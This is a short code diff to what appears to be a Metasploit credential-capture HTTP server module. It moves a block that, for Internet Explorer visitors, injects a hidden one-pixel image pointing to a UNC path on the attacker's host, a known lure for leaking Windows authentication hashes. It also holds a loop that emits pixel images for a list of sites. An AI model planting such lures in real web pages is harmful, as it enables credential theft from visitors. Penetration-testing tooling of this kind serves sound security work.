@@ -253,10 +253,6 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 
 		
 		buff = ''
-		
-		if(ua_name == "IE")
-			buff << "<img src='\\\\#{mysrc}\\public#{Time.now.to_i.to_s}\\loading.jpg' width='1' height='1'>"
-		end
 
 		list = File.readlines(@sitelist)
 		list.each do |site|
@@ -266,6 +262,10 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 			buff << "<img src='http://#{site}/pixel.gif'>"
 		end
 
+		if(ua_name == "IE")
+			buff << "<img src='\\\\#{mysrc}\\public#{Time.now.to_i.to_s}\\loading.jpg' width='1' height='1'>"
+		end
+		
 		data = File.read(@template)
 		data.gsub!(/%CONTENT%/, buff)
 				
